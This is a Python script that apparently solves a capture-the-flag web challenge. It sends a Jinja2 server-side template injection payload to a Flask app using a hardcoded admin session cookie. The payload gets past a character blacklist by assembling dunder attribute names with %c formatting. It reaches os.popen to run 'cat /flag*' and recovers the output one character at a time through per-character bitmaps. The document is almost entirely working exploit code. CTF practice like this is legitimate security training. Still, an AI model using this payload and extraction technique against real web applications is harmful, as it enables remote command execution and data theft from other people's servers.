from hashlib import sha256
from string import printable, whitespace

from flask import session
from requests import get, post

BANNED = whitespace + "\\[]._x"
SESSION = ".eJwlzjkOwjAQQNG7uKbw2LPYXAZ5NpECigQqxN2JxK9_8T7llnsc93J97e-4lNvm5VoU23JIRQI2cO9IFDpGp7Ax0BAmpVDtQ-FMrXX1ZoyR5GQ8xFhrPyezxTN8pHIaVlICwYm82LQ10QbTImG62OyStYqsLuWEvI_Y_5rlj-1Zvj-L1jEc.ZhsPQQ.n32vYXXNNvIZm0YB2TThlPOhQFo"
USERNAME = "admin"

if __name__ == "__main__":
    bitmaps = dict[str, str]()
    for char in printable:
        if char in BANNED:
            continue
        exploit = f"""
{{%for a in cycler|attr("%c%cinit%c%c"%((95,)*4))|attr("%c%cglobals%c%c"%((95,)*4))|items|selectattr("0","equalto","os")|first|last|attr("popen")("cat /flag*")|attr("read")()|attr("strip")()%}}{{%if a=={char!r}%}}1{{%else%}}0{{%endif%}}{{%endfor%}}
""".strip()
        if "\\" in exploit:
            continue
        id = sha256((USERNAME + exploit).encode()).hexdigest()
        with post(
            "http://pwnhub.hammer.b01le.rs/createpost",
            {"content": exploit},
            cookies={"session": SESSION},
        ) as req:
            req.raise_for_status()
        with get(
            f"http://pwnhub.hammer.b01le.rs/view/{id}", cookies={"session": SESSION}
        ) as req:
            req.raise_for_status()
            bitmap = req.text[
                req.text.find("Post contents here: ")
                + len("Post contents here: ") : req.text.find("</body>")
            ]
        bitmaps[char] = bitmap
        print(f"{char}: {bitmap}")
    result = ["{"] * len(next(iter(bitmaps.values())))
    for char, bitmap in bitmaps.items():
        for idx, bit in enumerate(bitmap):
            if bit == "1":
                result[idx] = char
    print("".join(result))
